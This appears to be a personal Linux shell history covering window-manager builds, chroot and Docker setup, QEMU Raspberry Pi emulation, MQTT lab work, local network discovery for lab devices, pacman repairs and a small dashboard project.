cp ~/.xinitrc  ~/.xinirtc-manual
chmod +x ~/.config/chadwm/scripts/*.sh

cd ~/.config/chadwm/chadwm
sudo make clean install

rm -rf ~/.config/chadwm
mv ~/chadwm ~/.config/chadwm

mv ~/chadwm ~/.config/chadwm

ls -l -a | grep config
cp -r ~/.config/chadwm/eww ~/.config/

mkdir -p ~/.config/
cp -r ~/chadwm ~/.config/chadwm

ls rofi/
ls eww/
ls chadwm/
git clone https://github.com/siduck/chadwm.git
git clone https://github.com/chadcat7/chadwm.git
rm -rf chadwm/
git clone https://github.com/chadcat7/chadwm.git ~/chadwm
cd ~/chadwm
sudo make clean install

sudo pacman -S nvidia nvidia-utils

sudo pacman -R nvidia-dkms

uname -r

sudo pacman -S ttf-font-awesome ttf-jetbrains-mono feh picom

sudo pacman -S xorg xorg-xinit xorg-server

/sbin/ldconfig -p

sudo ldconfig -p
sudo ldconfig
ldconfig
lsconfig
pcsc_scan
sudo systemctl restart pcscd

sudo mount --bind /run/pcscd /home/bb/Downloads/ubuntu/run/pcscd

sudo mount --bind /run/pcscd /home/Downloads/ubuntu/run/pcscd

sudo mount --bind /run/pcscd /home/oai-cn5g/run/pcscd

cd ubuntu/
systemctl status pcscd.socket

sudo systemctl enable --now pcscd.socket

sudo pacman -S pcsclite ccid pcsc-tools

# Create target directories if they don't exist
sudo mkdir -p /home/bb/Downloads/ubuntu/{proc,sys,dev,dev/pts,dev/shm,run,tmp,var/run}

# Mount system filesystems and devices
sudo mount --bind /proc /home/bb/Downloads/ubuntu/proc
sudo mount --bind /sys /home/bb/Downloads/ubuntu/sys
sudo mount --bind /dev /home/bb/Downloads/ubuntu/dev
sudo mount --bind /dev/pts /home/bb/Downloads/ubuntu/dev/pts
sudo mount --bind /dev/shm /home/bb/Downloads/ubuntu/dev/shm
sudo mount --bind /run /home/bb/Downloads/ubuntu/run
sudo mount --bind /tmp /home/bb/Downloads/ubuntu/tmp

# Mount the Docker socket for Docker access in chroot
sudo mount --bind /var/run/docker.sock /home/bb/Downloads/ubuntu/var/run/docker.sock

sudo rm /home/bb/Downloads/ubuntu/etc/resolv.conf

sudo cp /etc/resolv.conf /home/bb/Downloads/ubuntu/etc/resolv.conf
sudo chroot /home/bb/Downloads/ubuntu /bin/zsh

pwqd
sudo pacman -S stlink
sudo mount --bind /dev dev/
sudo mount --bind /proc proc/
sudo mount --bind /sys sys/
sudo mount --bind /tmp tmp/
sudo mount --bind /dev/pts dev/pts/
sudo mount --bind /var/run/docker.sock var/run/docker.sock  
sudo mount --bind /usr/bin/docker usr/bin/docker
sudo mount --bind /dev dev/
sudo mount --bind /proc proc/
sudo mount --bind /sys sys/
sudo mount --bind /tmp
sudo mount --bind /dev/pts dev/pts/
sudo mount --bind /var/run/docker.sock var/run/docker.sock  
sudo mount --bind /usr/bin/docker usr/bin/docker
sudo mount --bind /dev /mnt/ubuntu-root/dev
sudo mount --bind /proc /mnt/ubuntu-root/proc
sudo mount --bind /sys /mnt/ubuntu-root/sys
rm test.txt
code test.txt
cat  /sbin/mount >> test.txt
cat /sbin/mount
docker --help
docker run
docker images
rm -r openairinterface5g-develop-doc-tutorial_resources-oai-cn5g/ oai-cn5g.zip
mv openairinterface5g-develop-doc-tutorial_resources-oai-cn5g/doc/tutorial_resources/oai-cn5g/ oai-cn5g
unzip oai-cn5g.zip
wget -O oai-cn5g.zip  "https://gitlab.eurecom.fr/oai/openairinterface5g/-/archive/develop/openairinterface5g-develop.zip?path=doc/tutorial_resources/oai-cn5g"
cdls
ls openairinterface5g-develop-doc-tutorial_resources-oai-cn5g/doc/
ls openairinterface5g-develop-doc-tutorial_resources-oai-cn5g/
mv openairinterface5g-develop.zip?path=doc\%2Ftutorial_resources\%2Foai-cn5g  oai-cn5g.zip
wget "https://gitlab.eurecom.fr/oai/openairinterface5g/-/archive/develop/openairinterface5g-develop.zip?path=doc/tutorial_resources/oai-cn5g"
sudo rm -rf oai-cn5g/
rm -rf oai-cn5g/
# 1. Install basic tools
sudo pacman -Syu --noconfirm git net-tools putty

# 2. Install Docker and dependencies
sudo pacman -S --noconfirm docker docker-compose

# 3. Enable and start Docker service
sudo systemctl enable docker
sudo systemctl start docker

# 4. Add your user to the docker group to avoid using `sudo` with docker
sudo usermod -aG docker $USER
newgrp docker  # Or reboot later for the group change to take effect

# 5. Download OAI CN5G tutorial resources
wget -O ~/oai-cn5g.zip "https://gitlab.eurecom.fr/oai/openairinterface5g/-/archive/develop/openairinterface5g-develop.zip?path=doc/tutorial_resources/oai-cn5g"
unzip ~/oai-cn5g.zip
mv ~/openairinterface5g-develop-doc-tutorial_resources-oai-cn5g/doc/tutorial_resources/oai-cn5g ~/oai-cn5g
rm -r ~/openairinterface5g-develop-doc-tutorial_resources-oai-cn5g ~/oai-cn5g.zip

# 6. Pull OAI Docker images
cd ~/oai-cn5g
docker compose pull

# 7. Start OAI CN5G stack in detached mode
docker compose up -d

# 8. To stop the stack
docker compose down

lsusb
st-info --probe
st-info --version
st-info probe
sudo nano /etc/udev/rules.d/49-stlinkv2.rules

lsusb

sudo dmesg | tail -n 20

dmesg | tail -n 20

st-util
/bin/bash
sudo pacman -S
sudo mount -o remount,mode=620,ptmxmode=666,gid=5 devpts /dev/pts

ls -ld /dev/pts
ls -l /dev/ptmx
ls -l /dev/pts/ptmx

sudo pacman -S pcmanfm
sudo mount --bind /dev /home/bb/Downloads/ubuntu/dev

ls -l /dev/ptmx

mount | grep /dev/pts

sudo mkdir -p /home/bb/Downloads/ubuntu/dev/pts

sudo mount --bind /dev/pts /home/bb/Downloads/ubuntu/dev/pts

sudo chroot /home/bb/Downloads/ubuntu /bin/bash

sudo chroot . /bin/bash
sudo chroot . /bin/zsh
chroot . /bin/zsh
chroot ./bin/zsh
sudo mount --bind /sys/fs/cgroup /home/bb/Downloads/ubuntu/sys/fs/cgroup
sudo mount --bind /proc /home/bb/Downloads/ubuntu/proc
sudo mount --bind /sys /home/bb/Downloads/ubuntu/sys
sudo mount --bind /dev /home/bb/Downloads/ubuntu/dev

sudo systemd-hwdb update
sudo udevadm trigger

sudo nano /etc/udev/hwdb.d/99-custom-keyboard.hwdb

xdg-mime query default inode/directory

xdg-mime default pcmanfm.desktop inode/directory

sudo pacman -S qt5-base

pcmanfm
m
hyfetch
sudo pacman -S hyfetch
sudo pacman -S countryfetc
sudo pacman -Ss neofetch
sudo pacman -S neofetch
pacman -S neofetch
neofetch
sudo chroot . /bin/sh
sudo chroot . /bin/
sudo chroot ./bin/
chroot ./bin/
chroot ./bin/sh
sudo chroot ./bin/sh
sudo chroot /bin/sh
sudo chroot./bin/sh
sudo cp -L /etc/resolv.conf etc/resolv.conf
sudo mount --bind /dev $PWD/dev
sudo mount --bind /proc $PWD/proc
sudo mount --bind /sys $PWD/sys
tar -xvzf ubuntu-base-22.04.5-base-amd64.tar.gz
mv ubuntu-base-22.04.5-base-amd64.tar.gz  ubuntu
mkdir -p ubuntu
cd usr/
ls -la /mnt/
sudo rm -rf /mnt/ubuntu-iso/
rm -rf /mnt/ubuntu-iso/
vim publisher.py
cd ACM-SUMMER-SCHOOL-KARE/MQTT/MQTT\ Based\ Smart\ Factory/
sudo docker ps
cudatools
sudo pacman -S cuda-tools
sudo pacman -Ql cuda
sudo pacman -Q cuda
sudo pacman -S cuda
sudo pacman -Ss cuda
sudo pacman -S vulkan-nouveau
sudo pacman -Ss vulkan
sudo pacman -S vulkan
sudo pacman -S fwupd
sudo pacman -Ss fwupd
sudo pacman -Ss arch
sudo pacman -Ss whoami
whoami
sudo mkdir /mnt/ubuntu-iso
mkdir /mnt/ubuntu-iso
sudo pacman -S squashfs-tools squashfuse
sudo pacman -Ss squash
while true
if sudo ./input4 
notify-send -u normal "Device is up"
else
notify-send -u normal "Device is down"
end
end
while true
if ./input4 
notify-send -u normal "Device is up"
else
notify-send -u normal "Device is down"
end
end
vim input4.c
sudo ./input4
gcc -o input4 input4.c
sudo python input4-new.py
python input4-new.py
vim input4-new.py
sudo pacman -S python-evdev
sudo pacman -S evdev
sudo evtest /dev/input/event4
sudo evtest 4
evtest
sudo pacman -S evtest
python input4.py
vim input4.py
watch -n 0.5 cat /sys/class/input/event4/device/*
cat /sys/class/input/event4/device/*
cat /sys/class/input/event4/device/name
hexdump in0.bin
sudo cat /dev/input/by-path/pci-0000:00:1f.0-platform-VPC2004:00-event > in1.bin
hexdump in1.bin
sudo cat /dev/input/by-path/pci-0000:00:1f.0-platform-VPC2004:00-event > in0.bin
sudo cat /dev/input/by-path/pci-0000:00:1f.0-platform-VPC2004:00-event | hexdump
sudo cat /dev/input/by-path/pci-0000:00:1f.0-platform-VPC2004:00-event
cat /dev/input/by-path/pci-0000:00:1f.0-platform-VPC2004:00-event
cat /sys/class/input/event4/device/uevent
cat /sys/class/input/event4/device/inhibited
cat /sys/class/input/event8/device/inhibited
cat /sys/class/input/event8/device/event8/uevent
cat /sys/class/input/event8/device/name
for i in (seq 0 16)
echo $i | cat - /sys/class/input/event$i/device/name
end
for i in (seq 0 16)
cat /sys/class/input/event$i/device/name
end
cat /sys/class/input/event15/device/name
cat /sys/class/input/event16/device/name
ip -a
code  MQTT\ Pub\ \&\ Sub/
sudo docker stop 97845428d617
sudo docker compose  up -d
sudo docker compose  up -it
sudo mkdir -p /tmp/mosquitto/{config,data,log}
sudo cp -r ./config/* /tmp/mosquitto/config/
sudo mkdir -p /tmp/mosquitto/{config,data,log}
cp -r ./config/* /tmp/mosquitto/config/
mkdir -p /tmp/mosquitto/{config,data,log}
cp -r ./config/* /tmp/mosquitto/config/
sudo docker run --rm -it \
                                                     -v "$PWD/config:/mosquitto/config" \
                                                     eclipse-mosquitto:2 \
                                                     mosquitto_passwd -c /mosquitto/config/passwd_file your_username
code docker-compose.yml
code config/mosquitto.conf
sudo docker  run -d   35f50ba5c110
sudo docker  run  35f50ba5c110 -d
sudo docker images
sudo docker up -it
sudo docker compose down
sudo docker down
sudo docker compose up -d
sudo docker run --rm -it \

cd ACM-SUMMER-SCHOOL-KARE/MQTT/
# Check all containers (including stopped ones)
sudo docker ps -a

# Check the logs to see what went wrong
sudo docker logs mqttbrokersetupusingdocker-mosquitto-1
ls -la config/passwd_file
sudo chown root:root config/passwd_file
sudo docker stop  thirsty_pasteur

sudo docker stop a
docker stop --help a
sudo docker run --rm -it
sudo docker rm -r /
uv pip install paho-mqtt
ip addr
ip adder
ipconfig
cp MQTT\ Pub\ \&\ Sub/subscriber.py  MQTT\ Based\ Smart\ Factory/
cp MQTT\ Pub\ \&\ Sub/publisher.py  MQTT\ Based\ Smart\ Factory/
mv MQTT\ Pub\ \&\ Sub/ MQTT\ Pub\ \\ Sub/
code MQTT\ Pub\ \&\ Sub/
sudo pacman -S  paho.mqtt.client as mqtt  time  json  random threading  argparse
sudo pacman -S python-uv
sudo pacman -Ss uv
code MQTT\ Based\ Smart\ Factory/
sudo docker run -d  35f50ba5c110
cd MQTT/MQTT\ Based\ Smart\ Factory/
ls log/
ls data/
cd mosquitto/config/
cd iot/
sudo usermod -aG docker $USER

# Either logout/login OR run:
newgrp docker
sudo docker exec -it  hungry_jemison sh
sudo docker exec -it  hungry_jemison
sudo docker exec -it  hungry_jemison  bash
sudo docker exec -it c18a47103daa
sudo docker exec -it c18a47103daa bash
sudo docker exec -it c18a47103daa fish
sudo docker run 35f50ba5c110
sudo docker start  35f50ba5c110
docker run 35f50ba5c110
docker --list
sudo pacman -S docker-compose
sudo pacmsn -S docker-compose
sudo docker build ~/ACM-SUMMER-SCHOOL-KARE/Raspberry\ PI/hello-world
sudo docker build hello-world
docker build hello-world
sudo docker run dockerfile
mv Dockerfile dockerfile
cd CoAP\ Server\ Setup\ Using\ Docker/
newgrp --list
sudo docker run docker-compose.yml
docker run docker-compose.yml
sudo docker run hello-world
docker run hello-world
newgrp
sudo usermod -aG docker $USER
sudo chmod 755 hello-world
chmod -x hello-world
sudo systemctl start docker.service

docker run -f hello-world
docker run hello-world -f
mv Dockerfile  hello-world
docker run Dockerfile
wget https://raw.githubusercontent.com/docker-library/hello-world/a71acd2dfb8c21c8e42a8f926ce37c1ffbf8eae7/amd64/hello-world/Dockerfile
docker run --help
docker run CoAP\ Server\ Setup\ Using\ Docker/Dockerfile
cat CoAP\ Server\ Setup\ Using\ Docker/Dockerfile
ls CoAP\ Server\ Setup\ Using\ Docker/
;ls
open Dashboard.html
docker
pacman -Ql docker
sudo pacman -Syu

# 2. Install Docker and related tools
sudo pacman -S docker docker-compose docker-buildx
code install_docker.sh
./install_docker.sh
chmod +x install_docker.sh
cd Docker\ Install/
cd Raspberry\ PI/CoAP\ Server\ Setup\ Using\ Docker/
nmap -sn 192.168.1.0/24

nmui
nmup
ssh iot@192.168.1.111
ssh iot@192.168.137.111
sudo arp-scan --interface=eth0 192.168.1.0/24

sudo arp-scan --interface=eth0 192.168.1.

sudo pacman -S arp-scan

ssh GROUP-8@192.168.137.111
sudo pacman -S nmap

yay -S ipscan  # If you use yay/AUR helper

sudo pacman -S ipscan

sudo pacman -Ss ipscan
sudo pacman -Ss angry
sudo pacman -Ss angryip
sudo qemu-system-arm \
           -kernel kernel-qemu-5.10.63-bullseye \
           -cpu arm1176 \
           -m 256M \
           -M versatilepb \
           -dtb versatile-pb.dtb \
           -no-reboot \
           -append "root=/dev/sda2 rootfstype=ext4 rw console=ttyAMA0,115200" \
           -hda file=2025-05-13-raspios-bookworm-armhf-lite.img \
           -nographic \
           -net nic \
           -net tap,ifname=tap0,script=no,downscript=no
sudo qemu-system-arm \
           -kernel kernel-qemu-5.10.63-bullseye \
           -cpu arm1176 \
           -m 256M \
           -M versatilepb \
           -dtb versatile-pb.dtb \
           -no-reboot \
           -append "root=/dev/sda2 rootfstype=ext4 rw console=ttyAMA0,115200" \
           -hda 2025-05-13-raspios-bookworm-armhf-lite.img \
           -nographic \
           -net nic \
           -net tap,ifname=tap0,script=no,downscript=no
sudo qemu-system-arm \
           -kernel kernel-qemu-5.10.63-bullseye \
           -cpu arm1176 \
           -m 256M \
           -M versatilepb \
           -dtb versatile-pb.dtb \
           -no-reboot \
           -append "root=/dev/sda2 rootfstype=ext4 rw console=ttyAMA0,115200" \
           -hda 2025-05-13-raspios-bookworm-armhf.img \
           -nographic \
           -net nic \
           -net tap,ifname=tap0,script=no,downscript=no
qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 256M -nographic -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive 2025-05-13-raspios-bookworm-armhf-lite.img ,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 256M -nographic -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  

telnet localhost 3333
telnet google.com  3333
sudo telnet localhost
telnet localhost
sudo pacman -S inetutils
routel
telnet
sudo pacman -S perl-net-telnet
sudo pacman -Ss telnet
sudo chmod 666 /dev/ttyACM1
sudo chmod 666 /dev/ttyACM0

sudo chmod a+rx /dev/ttyACM0
sudo chmod a+x /dev/ttyACM0
chmod a+x /dev/ttyACM0
qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -drive file=kernel8.img 

dd if=/dev/zero bs=1 count=0 seek=16M of=kernel8.img

cp kernel8.img kernel9.img
qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -drive kernel8.img=on 

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -drive kernel8.img 

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
   -nographic 

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio -nographic 

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 1 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio \

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \  -nographics
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio \

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio \

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.qcow2,format=qcow2,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio \
  -device usb-net,netdev=net0 \
  -netdev user,id=net0,hostfwd=tcp::2222-:22

sudo umount /mnt

cp /mnt/kernel8.img .
cp /mnt/bcm2710-rpi-3-b-plus.dtb .

sudo mount -o loop,offset=8388608 2025-05-13-raspios-bookworm-arm64-lite.img /mnt

fdisk -l 2025-05-13-raspios-bookworm-arm64-lite.qcow2

fdisk -l 2025-05-13-raspios-bookworm-arm64-lite.img

sudo pacman -S kernel8.img
qemu-img resize 2025-05-13-raspios-bookworm-arm64-lite.qcow2 8G

ls -h
qemu-img resize 2025-05-13-raspios-bookworm-arm64-lite.qcow2 6G

qemu-img convert -f raw -O qcow2 2025-05-13-raspios-bookworm-arm64-lite.img 2025-05-13-raspios-bookworm-arm64-lite.qcow2

qemu-img resize 2025-05-13-raspios-bookworm-arm64-lite.img  4
qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -drive file=2025-05-13-raspios-bookworm-arm64-lite.img,format=raw,if=sd \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio \
  -device usb-net,netdev=net0 \
  -netdev user,id=net0,hostfwd=tcp::2222-:22

qemu-system-aarch64 \
  -machine raspi3b \
  -cpu cortex-a72 \
  -m 1G -smp 4 \
  -dtb bcm2710-rpi-3-b-plus.dtb \
  -kernel kernel8.img \
  -sd 2025-05-13-raspios-bookworm-arm64-lite.img \
  -append "rw earlyprintk loglevel=8 console=ttyAMA0,115200 dwc_otg.lpm_enable=0 root=/dev/mmcblk0p2 rootdelay=1" \
  -serial stdio \
  -device usb-net,netdev=net0 \
  -netdev user,id=net0,hostfwd=tcp::2222-:22

./install1.sh  2025-05-13-raspios-bookworm-arm64-lite.img  rasbi3
rm -rf rasbi3
code install1.sh
cd ../qemu/
rm -rf ras3b  raspi3
mv 2025-05-13-raspios-bookworm-arm64-lite.img  ~/qemu/
unxz 2025-05-13-raspios-bookworm-arm64-lite.img.xz
mv 2017-04-10-raspbian-jessie.img  2025-05-13-raspios-bookworm-armhf-lite.img  ~/Downloads/
./install1.sh  2025-05-13-raspios-bookworm-armhf-lite.img  raspi3
mv 2017-04-10-raspbian-jessie\(2\).zip  ~/Downloads/
mv 2025-05-13-raspios-bookworm-armhf-lite.img  ~/qemu/
unxz 2025-05-13-raspios-bookworm-armhf-lite.img.xz
sudo pacman -Ss xz
sudo pacman -Ss xz-utils
sudo pacman -S xz-utils
sudo pacman -S unxz
cat install1.sh
./install1.sh  2017-04-10-raspbian-jessie.img  ras3b
chmod +x install1.sh
rm -rf rasbi
vim install1.sh
pacman -Ql edk2-aarch64
pacman -Ql edk2-aarch64 | grep edk2-aarch64-code.fd
sudo find / -name edk2-aarch64-code.fd 2>/dev/null
pacman -Q edk2-aarch64
sudo pacman -S edk2-aarch64
code install.sh
find . -name "edk2"
./install.sh 2017-04-10-raspbian-jessie.img  rasbi
chmod +x install.sh
vim install.sh
cp install.sh  ~/qemu/
fdisk -l 2017-04-10-raspbian-jessie.img
unzip '2017-04-10-raspbian-jessie(2).zip'
sudo pacman -S unzip
sudo pacman -Ss unzip
fdisk -l '2017-04-10-raspbian-jessie(2).zip'
mv 2017-04-10-raspbian-jessie\(2\).zip  ~/qemu/
mkdir -p qemu
git clone https://github.com/siduck/chadwm --depth 1  ~/.config/chadwm
cd ~/.config/chadwm/
mv eww ~/.config

code README.md
code nord.h
sudo pacman -S rofi acpi
sudo pacman -Ss xorg-xsetroot
sudo pacman -S imlib2
mkdir -p dwm
vim config.h
cd slstatus/
git clone https://github.com/Awan/slstatus.git
cd dwm-6.5/
vim config.
cd Downloads/dwm-6.5/
cat config.h1 | grep font
cat config.h1
patch < patches/0001-Apply-alpha-on-st-version-0.9.patch
ls patches/
git clone https://github.com/Shourai/st.git
rm -rf st-0.9.2.tar.gz  st-0.9.2
patch < st-alpha-20240814-a0274bc.diff
wget https://st.suckless.org/patches/alpha/st-alpha-20240814-a0274bc.diff
cp config.h ../config.h1
cp config.h ../ config.h1
cp config.h config.h1
patch < st-alpha-0.4.1.diff
code config.h
code config.
wget https://st.suckless.org/patches/alpha/st-alpha-0.4.1.diff
wget https://st.suckless.org/patches/alpha/st-alpha-0.9.2.diff
cd st-0.9.2/
code ~/.Xresources
chmod +x !
chmod +x !!
code ~/.xinitrc
# Check if alpha support is compiled in
strings dwm | grep -i alpha

# Test the transparency by running dwm
sudo make
make clean
sudo pacman -Ss subdl
sudo pacman -Ss subbrute
sudo pacman -Ss su
ls -la config*
# Check if expected changes are in the source files
grep -n "expected_function_or_variable" config.h dwm.c
# Or use your editor to manually inspect the changes
# Try the latest available alpha patch
wget https://dwm.suckless.org/patches/alpha/dwm-alpha-20180613-b69c870.diff

# Try to apply it
patch -p1 < dwm-alpha-20180613-b69c870.diff
cd ~/Downloads/dwm-6.5

# Let's see what alpha patches are available
curl -s https://dwm.suckless.org/patches/alpha/ | grep -o 'dwm-alpha-[^"]*\.diff' | sort
wget https://dwm.suckless.org/patches/alpha/dwm-alpha-6.5.diff
# Essential packages for dwm/st
sudo pacman -S base-devel libx11 libxft libxinerama

# For alpha patch support
sudo pacman -S libxcomposite libxrender

# Additional useful tools
sudo pacman -S xorg-server xorg-xinit xorg-xsetroot dmenu
sudo pacman -S xorg-server-xephyr  # For your Xephyr testing
# Essential packages
sudo pacman -S   build-essential libx11-dev libxft-dev libxinerama-dev
# For alpha patch
sudo pacman -S  libxcomposite-dev libxrender-dev
# Essential packages
sudo apt install build-essential libx11-dev libxft-dev libxinerama-dev
# For alpha patch
sudo apt install libxcomposite-dev libxrender-dev
qemu-system-arm -machine help
qemu-system-arm -machine
qemu-system-arm --list
sudo pacman -Ss qemu-system-aarch64
qemu-aarch64 -machine help
qemu-aarch64 -machines
qemu-aarch64 -machine
qemu-aarch64 --devices
qemu-aarch64 -devices
qemu-aarch64 -list
qemu-system-arm -list
qemu-system-arm
qemu-aarch64 --list
wifi
ssh GROUP-2@192.168.137.239
ssh GROUP-2 192.168.137.239
sudo pacman -S openssh
# After system updates work
sudo pacman -S reflector

# Generate fast mirrorlist
sudo reflector --country India,Singapore --age 12 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
sudo pacman -Syy
sudo vim /etc/pacman.d/mirrorlist
# Remove corrupted databases
sudo rm -rf /var/lib/pacman/sync/*

# Clear package cache
sudo pacman -Scc

# Refresh with working mirrors
sudo pacman -Syy
# Edit mirrorlist again
sudo vim /etc/pacman.d/mirrorlist
# Remove corrupted databases
sudo rm -rf /var/lib/pacman/sync/*

# Force fresh download
sudo pacman -Syy
sudo vim  /etc/pacman.d/mirrorlist

sudo code  /etc/pacman.d/mirrorlist

# Backup current mirrorlist
sudo cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.backup

# Edit mirrorlist
sudo nano /etc/pacman.d/mirrorlist
sudo ssh GROUP-2 192.168.137.239
ssh
stat /dev/ttyUSB0
pacman -Ss game
sudo pacman -S zsh
sudo pacman -Ss  osu
sudo pacman -Ss rasberry
sudo pacman -Ss rasberry-pi-imager
sudo pacman -Ss raberry-pi-imager
key.dns_resolver
wev
sudo pacman -S wev
sudo pacman -Ss xev
sudo pacman -S xev
sudo pacman -S !!!
sudo pacman -S !
sudo pacman -S !!
xev
# Check if DISPLAY is set correctly
echo $DISPLAY

# Should show something like :0 or :0.0
# If empty, set it:

ps aux
ps-aux -l
ps-aux
cd ../dwm-6.5/
cd ../st-0.9.2/
grep -n "font.*=" config.h
grep -n "font.*=" config.hgrep -n "font.*=" config.h
grep .vimrc
cd Downloads/st-0.9.2/
sudo pacman -S ttf-dejavu-nerd
# Remove corrupted database files
sudo rm -rf /var/lib/pacman/sync/*

# Force database refresh with double -y
sudo pacman -Syy
# Clear all pacman caches
sudo pacman -Scc

# Refresh mirrorlist (if you have reflector)
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist

# Or manually edit mirrorlist to use different mirrors
sudo nano /etc/pacman.d/mirrorlist
sudo pacman -Sy archlinux-keyring

grep honor-http-proxy

honor-http-proxy

sudo rm -r /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux

sudo pacman -Syu archlinux-keyring

sudo pacman-key --refresh-keys
pacman -Ss Deja Vu
fc-list  | grep Mono
fc-list  | grep mono
fc-list  | grep Liberation
vim config.mk
cat README
tar -xvzf  st-0.9.2.tar.gz
sudo visudo
sudo pacman -S vi
Xephyr :3 -screen 1280x720
Xephyr
sudo pacman -S xorg-server-xephyr
sudo pacman -Ss Xephyr
sudo pacman -S Xephyr
emacs config.def.h
tar -xvzf  dwm-6.5.tar.gz
tar -xvfz dwm-6.5.tar.gz
./Cursor-1.0.0-x86_64.AppImage
sudo chmod a+rw /dev/ttyUSB0

sudo chmod +x /dev/ttyUSB0
chmod +x /dev/ttyUSB0
ls -la comprehensive_firebase_report/
python generate_extended_graphs.py
cat real_firebase_graphs/analysis_summary.txt
ls -la real_firebase_graphs/
python direct_firebase_analyzer.py
find . -name "*.json" -type f | grep -i firebase
cat report_graphs/analysis_summary.txt
ls -la report_graphs/
python firebase_data_analyzer.py
python -m venv venv && source venv/bin/activate && pip install firebase-admin plotly kaleido
python -m pip install firebase-admin plotly kaleido
sudo pacman -S python-pip python-pandas python-numpy python-matplotlib python-seaborn python-scikit-learn
sudo pacman -S python-pip python-firebase-admin python-pandas python-numpy python-matplotlib python-seaborn python-scikit-learn python-plotly
which pacman && which yay && which pip
python -m pip install firebase-admin pandas numpy matplotlib seaborn scikit-learn plotly kaleido
which python && python --version
pip3 install firebase-admin pandas numpy matplotlib seaborn scikit-learn plotly kaleido
pip install firebase-admin pandas numpy matplotlib seaborn scikit-learn plotly kaleido
cd /home/bb/vscode && python firebase_data_analyzer.py
npm install chartjs-plugin-annotation
git commit -m "Fix chart legends and data access issues - update AQI thresholds and handle missing data"
git commit -m "Add comprehensive air quality score with cool visualization and fix timestamp display"
npm list chart.js react-chartjs-2
npm install chart.js react-chartjs-2
git commit -m "Fix ESLint warnings and Netlify build issues"
git commit -m "Add Netlify configuration for proper deployment"
git add netlify.toml
git commit -m "Initial commit: Air Quality Dashboard with ESP8266 integration and Netlify deployment"
git config --global user.email "bhuvanb1408@gmail.com"
git config --global user.name "BhuvanB404"
git branch -m main
git init
cd /home/bb/vscode && npm start
